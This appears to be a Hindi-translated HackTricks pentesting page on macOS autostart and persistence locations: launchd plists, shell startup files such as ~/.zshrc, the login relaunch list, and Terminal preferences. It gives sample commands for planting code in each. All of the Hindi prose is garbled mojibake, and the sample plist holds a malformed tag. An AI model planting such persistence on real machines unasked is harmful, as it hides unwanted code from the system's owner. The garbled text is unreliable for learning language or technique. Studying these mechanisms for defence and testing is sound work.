# macOS рдСрдЯреЛ рд╕реНрдЯрд╛рд░реНрдЯ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>

рдпрд╣ рдЦрдВрдб рдореБрдЦреНрдп рд░реВрдк рд╕реЗ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) рдмреНрд▓реЙрдЧ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ, рдЙрджреНрджреЗрд╢реНрдп рд╣реИ **рдЕрдзрд┐рдХ Autostart рд╕реНрдерд╛рдиреЛрдВ** (рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ) рдХреЛ рдЬреЛрдбрд╝рдирд╛, рдирд╡реАрдирддрдо macOS (13.4) рдХреЗ рд╕рд╛рде **рдХреМрди рд╕реЗ рддрдХрдиреАрдХ рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИрдВ** рдФрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ред

## рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕

{% hint style="success" %}
рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╕реНрдЯрд╛рд░реНрдЯ рд╕реНрдерд╛рди рдорд┐рд▓реЗрдВрдЧреЗ рдЬреЛ рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдХреБрдЫ рдХреЛ **рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░** рдФрд░ рдПрдХ рдмрд╣реБрдд **рд╕рд╛рдорд╛рдиреНрдп рдХреНрд░рд┐рдпрд╛**, рдирд┐рд░реНрдзрд╛рд░рд┐рдд **рд╕рдордп рдХреА рдорд╛рддреНрд░рд╛** рдпрд╛ рдПрдХ **рдХреНрд░рд┐рдпрд╛** рдХреЗ рд▓рд┐рдП **рдЗрдВрддрдЬрд╛рд░ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЖрдк рд╕рд╛рдорд╛рдиреНрдпрддрдГ рд░реВрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред
{% endhint %}

### Launchd

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

#### рд╕реНрдерд╛рди

* **`/Library/LaunchAgents`**
* **рдЯреНрд░рд┐рдЧрд░**: рдкреБрдирд░реНрдЖрд░рдВрдн
* рд░реВрдЯ рдЕрдиреБрдорддрд┐ рдЖрд╡рд╢реНрдпрдХ
* **`/Library/LaunchDaemons`**
* **рдЯреНрд░рд┐рдЧрд░**: рдкреБрдирд░реНрдЖрд░рдВрдн
* рд░реВрдЯ рдЕрдиреБрдорддрд┐ рдЖрд╡рд╢реНрдпрдХ
* **`/System/Library/LaunchAgents`**
* **рдЯреНрд░рд┐рдЧрд░**: рдкреБрдирд░реНрдЖрд░рдВрдн
* рд░реВрдЯ рдЕрдиреБрдорддрд┐ рдЖрд╡рд╢реНрдпрдХ
* **`/System/Library/LaunchDaemons`**
* **рдЯреНрд░рд┐рдЧрд░**: рдкреБрдирд░реНрдЖрд░рдВрдн
* рд░реВрдЯ рдЕрдиреБрдорддрд┐ рдЖрд╡рд╢реНрдпрдХ
* **`~/Library/LaunchAgents`**
* **рдЯреНрд░рд┐рдЧрд░**: рдкреБрдирд░реНрд▓реЙрдЧ-рдЗрди
* **`~/Library/LaunchDemons`**
* **рдЯреНрд░рд┐рдЧрд░**: рдкреБрдирд░реНрд▓реЙрдЧ-рдЗрди

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

**`launchd`** рдУрдПрд╕ рдПрдХреНрд╕ рдХрд░реНрдирд▓ рджреНрд╡рд╛рд░рд╛ рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдкрд░ рд╕рдмрд╕реЗ рдкрд╣рд▓рд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдФрд░ рдмрдВрдж рд╣реЛрдиреЗ рдкрд░ рдЕрдВрддрд┐рдо рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рд╣рдореЗрд╢рд╛ **PID 1** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **ASEP** **plists** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рдХреЛ рдкрдврд╝реЗрдЧреА рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧреА:

* `/Library/LaunchAgents`: рдкреНрд░рд╢рд╛рд╕рдХ рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдкрд┐рдд рдкреНрд░рддрд┐-рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ
* `/Library/LaunchDaemons`: рдкреНрд░рд╢рд╛рд╕рдХ рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдкрд┐рдд рд╕рд┐рд╕реНрдЯрдо-рд╡реНрдпрд╛рдкреА рдбреЗрдорди
* `/System/Library/LaunchAgents`: Apple рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдкреНрд░рддрд┐-рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдЬреЗрдВрдЯ
* `/System/Library/LaunchDaemons`: Apple рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╕рд┐рд╕реНрдЯрдо-рд╡реНрдпрд╛рдкреА рдбреЗрдорди

рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рдХрд░рддрд╛ рд╣реИ, `/Users/$USER/Library/LaunchAgents` рдФрд░ `/Users/$USER/Library/LaunchDemons` рдореЗрдВ рд╕реНрдерд┐рдд plists **рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред

**рдПрдЬреЗрдВрдЯ рдФрд░ рдбреЗрдорди рдХреЗ рдореБрдЦреНрдп рдЕрдВрддрд░ рд╣реИ рдХрд┐ рдПрдЬреЗрдВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рдХрд░рддреЗ рд╣реА рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдбреЗрдорди рд╕рд┐рд╕реНрдЯрдо рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдкрд░ рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВ** (рдХреНрдпреЛрдВрдХрд┐ ssh рдЬреИрд╕реА рд╕реЗрд╡рд╛рдПрдВ рд╣реИрдВ рдЬреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ)ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдЬреЗрдВрдЯ GUI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдмрдХрд┐ рдбреЗрдорди рдХреЛ рдкрд┐рдЫрд▓реЗ рдкреНрд▓реЗрди рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
рдРрд╕реЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдПрдХ рдПрдЬреЗрдВрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**, рдЗрдиреНрд╣реЗрдВ **рдкреНрд░реАрд▓реЙрдЧрд┐рди рдПрдЬреЗрдВрдЯреНрд╕** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ рд▓реЙрдЧрд┐рди рдкрд░ рд╕рд╣рд╛рдпрдХ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИред рдЗрдиреНрд╣реЗрдВ рднреА `/Library/LaunchAgents` рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣рд╛рдВ [**рдпрд╣рд╛рдВ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ)ред

{% hint style="info" %}
рдирдП рдбреЗрдорди рдпрд╛ рдПрдЬреЗрдВрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ **рдЕрдЧрд▓реЗ рдмреВрдЯ рдпрд╛** `launchctl load <target.plist>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЛрдб рд╣реЛрдВрдЧреАред рдЗрд╕рдХреЗ рд╕рд╛рде рд╣реА `launchctl -F <file>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ .plist рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрд┐рдирд╛ рд╡рд╣ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рднреА рд▓реЛрдб рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╡реЗ plist рдлрд╝рд╛рдЗрд▓реЗрдВ рдмреВрдЯ рдХреЗ рдмрд╛рдж рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдВрдЧреА)ред\
`launchctl unload <target.plist>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирд▓реЛрдб рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реЗ рд╕рдВрдХреЗрддрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдЧреА)ред

рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреЛрдИ **рдПрдЬреЗрдВрдЯ** рдпрд╛ **рдбреЗрдорди** **рдХреЛ** **рдЪрд▓рд╛рдиреЗ рд╕реЗ** **рд░реЛрдХрдиреЗ рд╡рд╛рд▓реА** рдХреЛрдИ **рдЪреАрдЬрд╝** (рдЬреИрд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдб) **рдирд╣реАрдВ рд╣реИ**, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдВ: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЧрдП рд╕рднреА рдПрдЬреЗрдВрдЯ рдФрд░ рдбреЗрдордиреЛрдВ рдХреА рд╕реВрдЪреА:
```bash
launchctl list
```
{% hint style="warning" %}
рдпрджрд┐ рдПрдХ plist рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдореА рд╕рд┐рд╕реНрдЯрдо рд╡рд╛рдЗрдб рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдХрд╛рд░реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ рди рдХрд┐ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рдЗрд╕рд╕реЗ рдХреБрдЫ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирдпрди рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### рд╢реИрд▓ рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдлрд╝рд╛рдЗрд▓реЗрдВ

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
рд▓реЗрдЦ (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* рд╕реВрдЪреАрдмрджреНрдз рд╕реНрдерд╛рди:
  * **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
  * **рдЯреНрд░рд┐рдЧрд░**: zsh рдХреЗ рд╕рд╛рде рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рдЦреЛрд▓реЗрдВ
  * **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  * **рдЯреНрд░рд┐рдЧрд░**: zsh рдХреЗ рд╕рд╛рде рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рдЦреЛрд▓реЗрдВ
  * рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
  * **`~/.zlogout`**
  * **рдЯреНрд░рд┐рдЧрд░**: zsh рдХреЗ рд╕рд╛рде рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ
  * **`/etc/zlogout`**
  * **рдЯреНрд░рд┐рдЧрд░**: zsh рдХреЗ рд╕рд╛рде рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ
  * рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
  * рд╕рдВрднрд╛рд╡рд┐рдд рдФрд░ рдЕрдзрд┐рдХ: **`man zsh`**
  * **`~/.bashrc`**
  * **рдЯреНрд░рд┐рдЧрд░**: bash рдХреЗ рд╕рд╛рде рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рдЦреЛрд▓реЗрдВ
  * `/etc/profile` (рдХрд╛рдо рдирд╣реАрдВ рдХрд┐рдпрд╛)
  * `~/.profile` (рдХрд╛рдо рдирд╣реАрдВ рдХрд┐рдпрд╛)
  * `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  * **рдЯреНрд░рд┐рдЧрд░**: xterm рдХреЗ рд╕рд╛рде рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдиреЗ рдХреА рдЙрдореНрдореАрдж рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ **рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ** рдФрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рднреА рдпрд╣ рддреНрд░реБрдЯрд┐ рдЙрдард╛рдИ рдЬрд╛рддреА рд╣реИ: xterm: `DISPLAY is not set`

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рд╢реИрд▓ рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣рдорд╛рд░реЗ рд╢реИрд▓ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд╕рдордп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ `zsh` рдпрд╛ `bash`ред рдЖрдЬрдХрд▓ macOS рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `/bin/zsh` рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ **рдЬрдм рд╣рдо `Terminal` рдЦреЛрд▓рддреЗ рд╣реИрдВ рдпрд╛ рдЙрдкрдХрд░рдг рдореЗрдВ SSH рдХрд░рддреЗ рд╣реИрдВ**, рдпрд╣реА рд╢реИрд▓ рдкрд░реНрдпрд╛рд╡рд░рдг рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣рдо рд░рдЦреЗ рдЬрд╛рддреЗ рд╣реИрдВред `bash` рдФрд░ `sh` рдЕрднреА рднреА рдЙрдкрд▓рдмреНрдз рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЙрдиреНрд╣реЗрдВ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рд╣рдо **`man zsh`** рдХреЗ рд╕рд╛рде рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рд╢реИрд▓ рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдПрдХ рд▓рдВрдмрд╛ рд╡рд┐рд╡рд░рдг рд╣реИред
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### рдлрд┐рд░ рд╕реЗ рдЦреЛрд▓реЗ рдЧрдП рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕

{% hint style="danger" %}
рдореБрдЭреЗ рдЗрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдФрд░ рд▓реЙрдЧрдЖрдЙрдЯ рдФрд░ рд▓реЙрдЧрдЗрди рдпрд╛ рд░реАрдмреВрдЯ рдХрд░рдиреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдмрдирд╛ред (рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓ рдирд╣реАрдВ рд░рд╣рд╛ рдерд╛, рд╢рд╛рдпрдж рдпреЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рддреЗ рд╕рдордп рдпрд╣ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

#### рд╕реНрдерд╛рди

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **рдЯреНрд░рд┐рдЧрд░**: рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рдлрд┐рд░ рд╕реЗ рдЦреЛрд▓рдиреЗ рдкрд░ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░реЗрдВ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

рд╕рднреА рдлрд┐рд░ рд╕реЗ рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред

рддреЛ, рдЕрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд┐рд░ рд╕реЗ рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ рдЕрдкрдирд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝рдирд╛** рд╣реЛрдЧрд╛ред

UUID рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдХреЗ рдпрд╛ `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` рдХреЗ рд╕рд╛рде рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдлрд┐рд░ рд╕реЗ рдЦреЛрд▓реЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
рдЗрд╕ рд╕реВрдЪреА рдореЗрдВ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### рдЯрд░реНрдорд┐рдирд▓ рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдПрдВ

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

#### рд╕реНрдерд╛рди

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **рдЯреНрд░рд┐рдЧрд░**: рдЯрд░реНрдорд┐рдирд▓ рдЦреЛрд▓реЗрдВ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЙрддреНрдкреАрдбрд╝рди

**`~/Library/Preferences`** рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдПрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреА рд╣реИрдВред рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдПрдВ рдЕрдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди/рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ **рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рд░рдЦ рд╕рдХрддреА рд╣реИрдВред

